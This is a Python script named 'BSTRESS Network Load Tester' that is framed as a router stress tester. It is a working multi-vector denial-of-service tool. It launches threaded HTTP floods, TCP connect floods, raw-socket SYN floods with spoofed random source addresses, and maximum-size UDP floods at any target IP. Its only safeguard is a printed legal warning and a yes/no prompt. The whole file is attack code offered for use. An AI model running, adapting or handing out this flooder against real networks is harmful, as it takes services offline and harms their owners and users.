import threading
import socket
import requests
import time
import psutil
import random
from collections import defaultdict
import argparse

class RouterStressTester:
    def __init__(self, target_ip, threads_per_attack=10):
        self.target_ip = target_ip
        self.threads_per_attack = threads_per_attack
        self.lock = threading.Lock()
        self.stop_flag = False
        self.stats = defaultdict(int)
        self.stats.update({
            'start_time': time.time(),
            'syn_raw': 0  # Separate counter for raw SYN packets
        })
        self.net_stats = psutil.net_io_counters()

    def http_flood(self):
        """Optimized HTTP flood with keep-alive"""
        session = requests.Session()
        url = f"http://{self.target_ip}"
        while not self.stop_flag:
            try:
                session.get(url, timeout=2)
                with self.lock:
                    self.stats['http'] += 1
            except:
                with self.lock:
                    self.stats['errors'] += 1

    def syn_flood(self, port=80):
        """Standard SYN flood using TCP sockets"""
        while not self.stop_flag:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    s.connect((self.target_ip, port))
                    with self.lock:
                        self.stats['syn'] += 1
            except:
                with self.lock:
                    self.stats['errors'] += 1

    def syn_flood_raw(self, port=80):
        """Advanced SYN flood using raw sockets (requires root)"""
        try:
            # Create raw socket
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # Craft SYN packet
            def craft_syn_packet():
                src_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                ip_header = b'\x45\x00\x00\x3c'  # IP header
                ip_header += b'\x00\x00\x40\x00\x40\x06\x00\x00'  # More IP header
                ip_header += socket.inet_aton(src_ip)  # Source IP (randomized)
                ip_header += socket.inet_aton(self.target_ip)  # Destination IP
                
                tcp_header = b'\x00\x50'  # Source port (random)
                tcp_header += port.to_bytes(2, 'big')  # Destination port
                tcp_header += b'\x00\x00\x00\x00'  # Sequence number
                tcp_header += b'\x00\x00\x00\x00'  # Acknowledgement number
                tcp_header += b'\x50\x02\xff\xff'  # Header length + SYN flag
                tcp_header += b'\x00\x00\x00\x00'  # Window size
                
                return ip_header + tcp_header
            
            while not self.stop_flag:
                try:
                    s.sendto(craft_syn_packet(), (self.target_ip, 0))
                    with self.lock:
                        self.stats['syn_raw'] += 1
                except:
                    with self.lock:
                        self.stats['errors'] += 1
                        
        except PermissionError:
            print("[!] Raw SYN flood requires root/admin privileges. Falling back to TCP SYN.")
            self.syn_flood(port)

    def udp_flood(self, port=53):
        """Maximized UDP payload flood"""
        payload = b'X' * 65507  # Maximum UDP payload
        while not self.stop_flag:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.sendto(payload, (self.target_ip, port))
                    with self.lock:
                        self.stats['udp'] += 1
            except:
                with self.lock:
                    self.stats['errors'] += 1

    def display_stats(self):
        """Real-time monitoring with minimal overhead"""
        while not self.stop_flag:
            time.sleep(1)
            with self.lock:
                current_time = time.time()
                elapsed = current_time - self.stats['start_time']
                current_net = psutil.net_io_counters()
                
                print("\033[H\033[J")  # Clear console
                print(r"""

░▒▓███████▓▒░ ░▒▓███████▓▒░▒▓████████▓▒░▒▓███████▓▒░░▒▓████████▓▒░░▒▓███████▓▒░▒▓███████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░        
░▒▓███████▓▒░ ░▒▓██████▓▒░   ░▒▓█▓▒░   ░▒▓███████▓▒░░▒▓██████▓▒░  ░▒▓██████▓▒░░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░     ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░     ░▒▓█▓▒░ 
░▒▓███████▓▒░░▒▓███████▓▒░   ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░▒▓███████▓▒░  
                                                                                            
                                                                                            
                         
                """)
                print(f"\nTarget: {self.target_ip} | Runtime: {int(elapsed)}s")
                print(f"HTTP: {self.stats['http']} | SYN: {self.stats['syn']} | RAW SYN: {self.stats['syn_raw']} | UDP: {self.stats['udp']}")
                print(f"Errors: {self.stats['errors']} | PPS: {sum(self.stats[k] for k in ['http','syn','syn_raw','udp'])/elapsed:.1f}")
                print(f"Network ↑: {(current_net.bytes_sent - self.net_stats.bytes_sent)/1024/1024:.1f}MB")
                print(f"Press CTRL+C to stop...")

    def run_test(self):
        """Start all attack threads"""
        attacks = [
            self.http_flood,
            self.syn_flood,
            self.syn_flood_raw,  # Added raw SYN flood
            self.udp_flood
        ]
        threads = []
        
        for attack in attacks:
            for _ in range(self.threads_per_attack):
                t = threading.Thread(target=attack)
                t.daemon = True
                t.start()
                threads.append(t)

        threading.Thread(target=self.display_stats, daemon=True).start()

        try:
            while True: time.sleep(0.1)
        except KeyboardInterrupt:
            self.stop_flag = True
            print("\n[!] Stopping attack...")
            time.sleep(1)
            self._show_final_stats()

    def _show_final_stats(self):
        elapsed = time.time() - self.stats['start_time']
        total = sum(self.stats[k] for k in ['http','syn','syn_raw','udp'])
        print("\n=== FINAL REPORT ===")
        print(f"Runtime: {elapsed:.1f}s | Packets: {total}")
        print(f"HTTP: {self.stats['http']} | SYN: {self.stats['syn']} | RAW SYN: {self.stats['syn_raw']} | UDP: {self.stats['udp']}")
        print(f"Error Rate: {self.stats['errors']/total*100:.1f}%")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BSTRESS Network Load Tester")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Threads per attack type")
    args = parser.parse_args()

    print("\n[!] LEGAL WARNING: For authorized testing only!")
    confirm = input(f"Stress test {args.target} with {args.threads} threads? (y/n): ")
    if confirm.lower() == 'y':
        RouterStressTester(args.target, args.threads).run_test()